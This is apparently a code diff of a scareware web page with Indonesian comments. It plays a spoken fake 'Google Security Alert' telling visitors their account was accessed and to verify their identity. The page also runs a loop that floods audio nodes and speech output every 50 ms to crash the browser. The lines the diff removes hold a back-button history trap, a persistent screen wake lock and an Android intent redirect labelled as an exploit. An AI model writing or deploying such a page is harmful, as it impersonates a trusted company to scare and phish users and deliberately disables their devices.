@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Advanced History & Exhaustion Chain</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #fff; min-height: 100vh; overflow: hidden; }
@@ -16,50 +16,22 @@
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY & EXPLOIT PARAMS
+  // KONFIGURASI AUTOPLAY
   // ============================================
   var CONFIG = {
     tts: {
-      text: "Google Security Alert. Browser navigation locked. Unauthorized access detected, preparing secure intent redirect.",
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
       rate: 0.85,
       pitch: 1.0,
       volume: 1.0,
       repeatInterval: 8000,
-      maxRepeats: 25
+      maxRepeats: 20
     },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    targetIntentUrl: 'intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end;'
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
 
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
-  let wakeLock = null;
-
-  // ============================================
-  // SCREEN WAKE LOCK API
-  // ============================================
-  async function requestPersistentWakeLock() {
-    if ('wakeLock' in navigator) {
-      try {
-        wakeLock = await navigator.wakeLock.request('screen');
-        wakeLock.addEventListener('release', () => {
-          setTimeout(requestPersistentWakeLock, 1000);
-        });
-      } catch (err) {}
-    }
-  }
-
-  // ============================================
-  // HISTORY API NAVIGATION FLOODING (Back Button Trap)
-  // ============================================
-  function triggerHistoryFlood() {
-    try {
-      for (var i = 0; i < 100; i++) {
-        window.history.pushState({page: i}, "Security Alert #" + i, "#trap-" + i);
-      }
-      console.log("[+] History navigation stack flooded.");
-    } catch(e) {}
-  }
 
   // ============================================
   // TTS — TANPA CANCEL DI DALAM LOOP
@@ -89,7 +61,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) {}
+    } catch (e) { console.log('[TTS] fail:', e.message); }
   }
 
   function startTTS() {
@@ -106,7 +78,7 @@
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -165,15 +137,12 @@
   }
 
   // ============================================
-  // UPGRADE: HISTORY TRAP + RESOURCE EXHAUSTION + DEEP LINK HIJACK
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
   // ============================================
-  function triggerAdvancedExploitChain() {
-    console.log("[!] Initiating Advanced History Trap & Exhaustion Chain...");
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
     
-    // Pemicu History Trap
-    triggerHistoryFlood();
-
-    // 1. Loop Pemicu Memory Leak pada Audio Engine & Speech Queue
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
       try {
         for (var i = 0; i < 2000; i++) {
@@ -181,23 +150,17 @@
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
           
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
           
-          var u = new SpeechSynthesisUtterance("HISTORY_EXHAUSTION_" + i);
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
           window.speechSynthesis.speak(u);
         }
       } catch(e) {}
-    }, 50);
-
-    // 2. Delayed Deep Link / Intent Redirection Hijacking
-    setTimeout(function() {
-      try {
-        console.log("[*] Executing final intent redirection payload...");
-        window.location.replace(CONFIG.targetIntentUrl);
-      } catch(e) {}
-    }, 4000);
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
   }
 
   // ============================================
@@ -205,11 +168,10 @@
   // ============================================
   unlockAudioContext();
   trySilentAudio();
-  requestPersistentWakeLock();
 
   setTimeout(function () {
     unlockAudioContext();
-    startTTS();
+    startTTS(); // coba TTS lebih awal
   }, 100);
 
   setTimeout(function () {
@@ -220,12 +182,12 @@
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
     
-    // PANGGIL EXPLOIT CHAIN DI SINI
-    triggerAdvancedExploitChain();
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
     
   }, 1500);
 
-  // Retry handler
+  // Retry jika audio diblokir
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
@@ -235,18 +197,10 @@
     if (retryCount > 10) clearInterval(retry);
   }, 2000);
 
-  // Popstate trap untuk mencegah navigasi mundur (Back Button Lock)
-  window.addEventListener('popstate', function(event) {
-    window.history.pushState({page: 'locked'}, "Security Alert", "#locked");
-  });
-
   // Visibility change
-  document.addEventListener('visibilitychange', async function () {
+  document.addEventListener('visibilitychange', function () {
     if (!document.hidden && !state.mainPlayed) {
       setTimeout(playMainAudio, 100);
-    }
-    if (wakeLock !== null && document.visibilityState === 'visible') {
-      await requestPersistentWakeLock();
     }
   });
 })();
